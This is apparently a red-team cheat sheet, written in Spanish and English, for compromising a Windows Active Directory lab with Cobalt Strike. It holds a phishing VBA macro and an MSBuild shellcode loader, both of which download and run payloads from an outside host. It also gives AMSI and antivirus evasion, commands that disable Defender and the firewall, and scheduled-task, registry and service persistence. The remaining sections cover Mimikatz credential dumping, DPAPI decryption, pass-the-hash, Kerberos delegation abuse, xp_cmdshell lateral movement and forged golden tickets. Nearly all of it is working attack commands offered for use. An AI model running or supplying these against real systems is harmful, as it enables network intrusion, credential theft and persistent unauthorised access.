### Metodology

- Initial Reconnaissance
- Detection and Policy Bypass
- Initial Enumeration & Hunting
- Local Privilege Escalation (if applicable)
- Credential Exfiltration
- Full Enumeration
- Lateral Movement
### Maleable c2

Modificación de perfil para evadir AMSI y  detecciones de comportamiento,  permite usar procesos legítimos menos monitoreados como destino de inyección.

```powershell
#Agregar en el perfil
sudo nano /home/attacker/cobaltstrike/c2-profiles/normal/webbug.profile

post-ex {  
        set amsi_disable "true";  
        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";  
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";  
}
---Start
attacker@ubuntu ~> cd cobaltstrike/
attacker@ubuntu ~/cobaltstrike>  sudo ./teamserver 10.10.5.50 password c2-profiles/normal/webbug.profile
```

### Artifact Kit

Conjunto de herramientas personalizables para crear inyectores de shellcode resistentes a detección

```powershell
C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
#Validar
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
#Cargar el Cobalt Strike Script en CS Manager
```

### Resource Kit

Usado para modificar los artefactos basados en scripts, incluidas las cargas útiles de PowerShell, Python, HTA y VB

```powershell
C:\Tools\cobaltstrike\arsenal-kit\kits\resource  
./build.sh /mnt/c/Tools/cobaltstrike/resources
#Cargar el Cobalt Strike Script en CS Manager y luego generar los payloads en CS Winnet
```

### Basic Listeners

- HTTP apunta al dns si existe
- SMB (crear varios)  -> ls  \\.\pipe\
- TCP
- TCP-Local

### Initial Compromise

#### VBA Macro  by Phishing

```powershell
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub
```

#### Living Off The Land Binaries, Scripts and Libraries

```Powershell

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
----Hostea el payload http_x64.xprocess.bin y ejecutalo en el target inicial
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe test.csproj
```

### Persistence

#### Task Scheduler

```Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA

en CS
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

#### Registry AutoRun

```Powershell
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

#### Elevated Host Persistence

```Powershell
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

### Privesc

#### Enum basic

```Powershell
Get-Service | fl
Get-CimInstance -ClassName Win32_Service | Select-Object Name, PathName
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
run wmic service get name, pathname
```

####  Unquoted Service Paths

```Powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
cd C:\Program Files\Vulnerable Services
upload C:\Payloads\tcp-local_x64.svc.exe
mv tcp-local_x64.svc.exe Service.exe
ls
run sc stop VulnService1
run sc start VulnService1
#verificar 127.0.0.1:4444 que este en listening y luego conectar
run netstat -anp tcp
connect localhost 4444
```

#### Weak Service Permissions

```Powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
#Subimos el payload y cambiamos la ruta del binario
mkdir C:\Temp
cd C:\Temp
upload C:\Payloads\tcp_local_x64.svc.exe
run sc config VulnService2 binPath= C:\Temp\tcp_local_x64.svc.exe
#para validar que se actualizo la ruta 
run sc qc VulnService2
run sc stop VulnService2
run sc start VulnService2
connect localhost 4444
## Para restaurar el servicio
# run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
```

#### Weak Service Binary Permissions

```Powershell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
#Hacemos una copia en la misma carpeta del binario 
cp "Service 3.exe" Service4.exe
upload C:\Payloads\Service 3.exe
# Para confirmar el error
C:\>net helpmsg 32
run sc stop VulnService3
upload C:\Payloads\Service 3.exe
run sc start VulnService3
connect localhost 4444
```

####  UAC Bypasses

```Powershell
elevate uac-schtasks tcp_local
```

### On every Host without exception

```Powershell
### Enumeracion Basica
sleep 0  (Solo para laboratorios xd)
getuid
run whoami  
powershell (Get-WmiObject Win32_ComputerSystem).Domain  
powershell $env:username;$env:computername  
powershell Get-LocalGroupMember -Group "administrators"
### Deteccion & Policy
#AV
powershell Get-MpPreference | Select-Object DisableIOAVProtection, DisableRealtimeMonitoring  
#Firewall
powershell netsh advfirewall show allprofiles
#Constrained Language Mode
powershell $ExecutionContext.SessionState.LanguageMode
#Policy
powershell Get-ExecutionPolicy  
powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
#Si no agregaste algun metodo de persistencia recomiendo agregar al grupo de administradores
run net localgroup administrators bfarmer /add
#Rutas grabables (Windows & Program Files)
powershell Get-Acl C:\Windows\Tasks | fl

--Recursos compartidos de archivos
powershell Find-DomainShare -CheckShareAccess
powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
powershell gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

--Databases
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"

----BAD OPSEC
powerpick Set-MpPreference -DisableRealtimeMonitoring $true
powerpick Set-MpPreference -DisableIOAVProtection $true
run netsh advfirewall set allprofiles state off
powerpick Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### Mimikatz

```powershell
### Volcar contraseñas de texto plano de la memoria
mimikatz !sekurlsa::logonpasswords
### Volcar  las claves de cifrado Kerberos de los usuarios que han iniciado sesión actualmente
mimikatz !sekurlsa::ekeys  puede dar des_cbc_md4 no hay probnlemas xq son validos
### Volcar  La base de datos del Administrador de cuentas de seguridad (SAM) solo contiene los hashes NTLM de las cuentas locales
mimikatz !lsadump::sam 
###  Volcar Las credenciales de caché de dominio (DCC) ( El único uso viable para estos es descifrarlos sin conexión)
mimikatz !lsadump::cache
### DC Sync
dcsync dev.cyberbotic.io DEV\krbtgt
```

### Full Enumeration

```powershell
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  
#Obtener Dominio:  
powershell Get-Domain  
#Obtener DC:  
powershell Get-DomainController | select Forest, Name, OSVersion | fl  
#Obtener Forest:  
powershell Get-ForestDomain  
#Domain User:  
powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl  
#Obtener Equipos:  
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

```

###  User Impersonation

```powershell
rev2self -> Para "eliminar" la suplantacion
kill 4748 ->  Para "eliminar" el proceso
# Pass the Hash
pth DEV\jking 59fc0f884922b4ce376051134c71e22c

#Pass the Ticket apuntar el LUID y el proceso muyimportante
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFu
steal_token 4748

# Overpass the Hash -> solicitar un TGT de Kerberos para un usuario, utilizando su hash NTLM o AES
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap

#Inyeccion de sesion simil a usar runas
make_token DEV\jking Qwerty123

#Inyeccion de proceso
inject 4464 x64 tcp-local
```

### Data Protection API

```powershell
#Enumeracion
run vaultcmd /list
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

#Descifrar la clave maestra
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
mimikatz !sekurlsa::dpapi
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
#en el blob
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

---Credenciales de tareas programadas

ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
mimikatz !sekurlsa::dpapi
mimikatz dpapi::cred
```


###  GPO Abuse


```powershell
--Modify Existing GPO
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
powershell Find-DomainShare -CheckShareAccess
gpupdate /force #obligar a actualizar

--- Create & Link a GPO

powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
powershell New-GPO -Name "Evil GPO"
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

### Pivoting


```powershell
ls \\web.dev.cyberbotic.io\c$ ---> Muy usado antes de saltar
link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10 ->(listener smb referente al payload)

#Los que mas use
### Windows Remote Management
jump winrm64 web.dev.cyberbotic.io smb
### PsExec
jump psexec64 web.dev.cyberbotic.io smb

```

### Kerberos

```powershell
### Kerberoasting
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

### ASREP Roasting
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

```powershell
### Unconstrained Delegation -> Obtencion de TGT en cache
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
#Tickets en cache
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage  
#Extraer Ticket o dumpear Ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap 
#Crear proceso guardar el proceso y el LUID
xecute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
steal_token 1540
ls \\dc-2.dev.cyberbotic.io\c$
---
#TGTs para las cuentas de equipo obligándolas a autenticarse de forma remota la máquina
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
luego **S4U2Self Abuse**
```

```powershell
#Encontrar 
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
#Ver tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
#Dumpear el ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
#Solicitar TGS apartir del TGT -> realizará primero un S4U2Self y luego un S4U2Proxy
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
#Tome el ticket final de S4U2Proxy y páselo a una nueva sesión de inicio de sesión.
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
steal_token 5540
ls \\dc-2.dev.cyberbotic.io\c$

----Solicitar un servicio alternativo
#solo teniamos cifs que de por si  es potente pero pediremos ldap que no teniamos
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
steal_token 2580

---S4U2Self -> TGS utilizable como un usuario que sabemos que es un administrador local
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

steal_token 2664
ls \\dc-2.dev.cyberbotic.io\c$
```

### MS SQL

```powershell
#Enumeracion Basica
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powershell Get-SQLInstanceDomain
powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
#Probar Conexion 
powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
#Verificar xp_cmdshell
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select name,value from sys.configurations WHERE name = 'xp_cmdshell'"
#Habilitar xp_cmdshell
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC('sp_configure ''show advanced options'', 1; reconfigure;')"
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')"
#Ejecutar comandos
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC xp_cmdshell 'powershell whoami'"
#descarga de beacon para conexion con hostfile
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80
$str = "IEX ((new-object net.webclient).downloadstring('http://sql-2.dev.cyberbotic.io:8080/c'))"  
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))  
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC xp_cmdshell 'powershell -enc SQBFAFgAIAAoA=......'"  
link sql-2.dev.cyberbotic.io TSVCPIPE-524b71ac-1076-4f72-9b85-c9de69c01234

-----Movimiento Lateral
#activar xp_cmdshell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]"
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]"

$str = IEX ((new-object net.webclient).downloadstring('http://sql-2.dev.cyberbotic.io:8080/b'))
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAbAAtADIALgBkAGUAdgAuAGMAeQBiAGUAcgBiAG8AdABpAGMALgBpAG8AOgA4ADAAOAAwAC8AYgAnACkAKQA=

execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iQuery /i:DEV\mssql_svc /c:"EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAbAAtADIALgBkAGUAdgAuAGMAeQBiAGUAcgBiAG8AdABpAGMALgBpAG8AOgA4ADAAOAAwAC8AYgAnACkAKQA=''') AT [sql-1.cyberbotic.io]"

link sql-1.cyberbotic.io TSVCPIPE-a90993a3-7586-41a7-ac51-9431bcb71234
rportfwd stop 8080

---Escalacion de privilegios

execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
$str = IEX ((new-object net.webclient).downloadstring('http://sql-2.dev.cyberbotic.io:8080/c'))
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAbAAtADIALgBkAGUAdgAuAGMAeQBiAGUAcgBiAG8AdABpAGMALgBpAG8AOgA4ADAAOAAwAC8AYwAnACkAKQA=

execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAbAAtADIALgBkAGUAdgAuAGMAeQBiAGUAcgBiAG8AdABpAGMALgBpAG8AOgA4ADAAOAAwAC8AYwAnACkAKQA="
```

### Domain Dominance

```powershell
----Silver Tickets
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
steal_token 5668
ls \\wkstn-1.dev.cyberbotic.io\c$

--- Golden Tickets

dcsync dev.cyberbotic.io DEV\krbtgt
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
steal_token 5060
run klist
ls \\dc-2.dev.cyberbotic.io\c$

--- Diamond Tickets

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

```

### Forest & Domain Trusts

```powershell
#Enum & Gold Ticket  -- two-way trust
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powershell Get-DomainTrust
powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
powershell Get-DomainController -Domain cyberbotic.io | select Name
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
run klist
ls \\dc-1.cyberbotic.io\c$
##Diamond Ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

---One-Way Inbound
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powershell Get-DomainTrust
powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
powershell Get-DomainForeignGroupMember -Domain dev-studio.com
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
run klist
ls \\dc.dev-studio.com\c$

---One-Way Outbound
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
mimikatz lsadump::trust /patch
